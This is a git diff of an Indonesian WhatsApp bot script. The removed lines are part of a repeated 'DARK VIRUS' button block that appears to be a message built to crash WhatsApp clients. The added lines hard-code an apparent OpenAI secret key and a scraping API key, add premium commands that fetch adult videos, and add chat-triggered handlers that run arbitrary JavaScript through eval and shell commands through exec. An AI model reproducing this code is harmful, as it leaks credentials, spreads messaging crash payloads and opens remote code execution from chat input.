-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
               { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
               { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
               { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
@@ -5302,7 +4652,7 @@ Kedalaman :${i.depth}\n\n`
         };
       }
         break
-      case 'igstory': case 'igs':
+      /*case 'igstory': case 'igs':
         if (!q) return reply(`url story nya? Contoh :\n${prefix + command} https://www.instagram.com/stories/btr_citraaa/2989344688605937050/`)
         if (!q.includes('instagram')) return reply(`Link timdack valid.`)
         var igs = await fetchJson(`https://api.xteam.xyz/dl/igs?url=${q}&APIKEY=apikeyaine`)
@@ -5319,7 +4669,7 @@ Kedalaman :${i.depth}\n\n`
         } catch (err) {
           reply(`Story timdack ditemukan.`)
         };
-        break
+        break*/
       case 'fbdownload': case 'fb':
         if (!q) return reply(`Example:\n${prefix + command} https://www.facebook.com/botikaonline/videos/837084093818982`)
         // if (!q.includes('facebook.com')) return reply(`Itu bukan link facebook!`)
@@ -5329,7 +4679,7 @@ Kedalaman :${i.depth}\n\n`
         if (fbd.success !== true) return reply(`Link download tidak tersedia, mungkin link error/tidak valid.`)
         conn.sendMessage(from, { text: `Wait . . .` }, { quoted: msg })
         //const boug1 = await getBuffer(fbd.download[0].url)
-        conn.sendMessage(from, { video: { url: fbd.download[0].url }, caption: `*Done !*\nQuality: ${fbd.download[0].quality}` }, { quoted: msg })
+        conn.sendMessage(from, { video: { url: fbd.download[0].url }, caption: `*Done !*\n*Quality:* ${fbd.download[0].quality}` }, { quoted: msg })
         break
      /* case 'twitter': case 'twit': case 'twitt': {
         if (!q) return reply(`Example : ${prefix + command} link`)
@@ -5392,19 +4742,16 @@ Kedalaman :${i.depth}\n\n`
         }
         conn.sendMessage(from, buttonNya)
         break
-      case 'aitalk':
-      case 'ai2':
-        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
-        if (!q) return reply(`Example:\n${prefix + command} hai ai`)
-        reply(mess.wait)
       case 'ai':
+      case 'openai':
+      case 'gura':
         if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
         if (!q) return reply(`Chat dengan AI.\n\nContoh:\n${prefix}${command} Apa itu rest api`)
         reply(mess.wait)
         try {
           var configuration = new Configuration({
             organization: "org-W7mm5jfj0hVwroQrR7bAOtK4",
-            apiKey: AIapi,
+            apiKey: "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",
           });
           let openai = new OpenAIApi(configuration);
           let response = await openai.createCompletion({
@@ -5416,25 +4763,26 @@ Kedalaman :${i.depth}\n\n`
             frequency_penalty: 0.0,
             presence_penalty: 0.0,
           });
-          conn.sendMessage(from, { text: `* A I *${response.data.choices[0].text}\n\n- ${botName}\n` }, { quoted: ftroli })
+          conn.sendMessage(from, { text: `* A I \n\n*${response.data.choices[0].text}\n\n- ${botName}\n` }, { quoted: ftroli })
         } catch (err) {
           console.log(err)
           reply('Maaf, bot tidak mengerti')
         }
         break
       case 'dall-e':
+      case 'dalle':
         if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
         if (!q) return reply(`Mencari gambar/foto dari Ai.\n\nContoh:\n${prefix}${command} gunung Bromo `)
         try {
           let configuration = new Configuration({
             organization: "org-W7mm5jfj0hVwroQrR7bAOtK4",
-            apiKey: AIapi,
+            apiKey: "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",
           });
           let openai = new OpenAIApi(configuration);
           let response = await openai.createImage({
             prompt: q,
-            n: 3,
-            size: "1024x1024",
+            n: 5,
+            size: "512x512",
           });
           console.log(response.data.data)
           let dalle = response.data.data
@@ -5469,8 +4817,85 @@ Kedalaman :${i.depth}\n\n`
         fs.unlinkSync(anime2)
         fs.unlinkSync(`./sticker/${sender.split("@")[0]}.jpg`)
         break
+        case 'xnxx':
+        case 'xnxxsearch':
+        case 'xnxxsearching':
+            if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+            if (cekUser("premium", sender) == null) return reply(mess.OnlyPrem)
+            if (!q) return reply(`*Example:\n${prefix + command} step sister`)
+            try {
+            let xnx = await fetchJson(`https://api.itsrose.site/dewasa/xnxx/search?query=${q}&apikey=itsroseUnlimitedLimit`)
+            if (xnx.status != true) return reply(`Mungkin query yang anda cari tidak ditemukan.`)
+            let xxx = `Hasil dari pencarian Xnxx-Search: ${q}\n\n`
+            for (let xn of xnx.result) {
+xxx += `
+⊦⊸ *Title:* ${xn.title}
+⊦⊸ *Views:* ${xn.views}
+⊦⊸ *Quality:* ${xn.quality}
+⊦⊸ *Duration:* ${xn.duration}
+⊦⊸ *Url:* ${xn.url}\n`
+xxx += '\n' + '•••••••••••••••••••••••••••••••••' + '\n'
+            }
+            conn.sendMessage(from, { text: xxx }, {quoted:msg})
+        } catch(e) {
+            console.log(e)
+            reply(`Error geiss..`)
+        }
+        break
+        case 'xnxxdl':
+        case 'xnxxdown':
+        case 'xnxxdownload':
+            if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
+            if (cekUser("premium", sender) == null) return reply(mess.OnlyPrem)
+            if (!q) return reply(`*Example:\n${prefix + command} https://www.xnxx.com/video-wvmwp36/knocking_my_step_sister_up`)
+            try {
+                let xnxdl = await fetchJson(`https://api.itsrose.site/dewasa/xnxx/detail?url=${q}&apikey=itsroseUnlimitedLimit`)
+                if (xnxdl.status != true) return reply(`Link tidak valid cuy.`)
+                let xnxres = xnxdl.result
+let xxxdl = `
+⊦⊸ *Title:* ${xnxres.title}
+⊦⊸ *Duration:* ${xnxres.duration}
+⊦⊸ *Quality:* ${xnxres.quality}
+⊦⊸ *Views:* ${xnxres.views}
+⊦⊸ *Rating:* ${xnxres.rating}
+⊦⊸ *Like:* ${xnxres.like}
+⊦⊸ *Dislike:* ${xnxres.dislike}
+⊦⊸ *Download:* 
+
+  - Low:  ${xnxres.download.low}
+  - High: ${xnxres.download.high}
 
 
+_Download sendiri jangan manja_`
+                conn.sendMessage(from, { text: xxxdl }, {quoted:msg})
+            } catch(e) {
+                console.log(e)
+                reply(`Waduh error masbro..`)
+            }
+            break
+        
+        case '>':
+          if (!isOwner) return reply(mess.OnlyOwner);
+          var err = new TypeError;
+          err.name = "EvalError "
+          err.message = "Code Not Found (404)"
+          if (!q) return reply(util.format(err))
+          var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
+          try {
+          var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
+          reply(txtes)
+          } catch(e) {
+          let _syntax = ""
+          let _err = util.format(e)
+          let err = syntaxerror(arg, "EvalError", {
+          allowReturnOutsideFunction: true,
+          allowAwaitOutsideFunction: true,
+          sourceType: "commonjs"
+          })
+          if (err) _syntax = err + "\n\n"
+          reply(util.format(_syntax + _err))
+          }
+          break
       default:
 
         /*━━━━━━━[ Function Menfess ]━━━━━━━*/
@@ -5492,8 +4917,34 @@ Kedalaman :${i.depth}\n\n`
 
       // AUTHOR : LEXXY OFFICIAL
       // INI CONSOLE LOG JNGN EDIT
-
-    }
+      // exec by ekuzika
+    } 
+    if (chats.startsWith('=>')) {
+      if (!isOwner) return reply(mess.OnlyOwner)
+      function Return(sul) {
+      sat = JSON.stringify(sul, null, 2)
+      bang = util.format(sat)
+      if (sat == undefined) {
+      bang = util.format(sul)
+      }
+      return reply(bang)
+      }
+      try {
+      reply(util.format(eval(`(async () => { ${chats.slice(3)} })()`)))
+      } catch (e) {
+      reply(String(e))
+      }
+      }
+  if (chats.startsWith('$')){
+      if (!isOwner) return reply(mess.OnlyOwner)
+      let qur = chats.slice(2)
+      exec(qur, (err, stdout) => {
+      if (err) return reply(`${err}`)
+      if (stdout) {
+      reply(stdout)
+      }
+      })
+      }
   } catch (err) {
     console.log(color('[ERROR]', 'red'), err)
     server_eror.push({ "error": `${err}` })
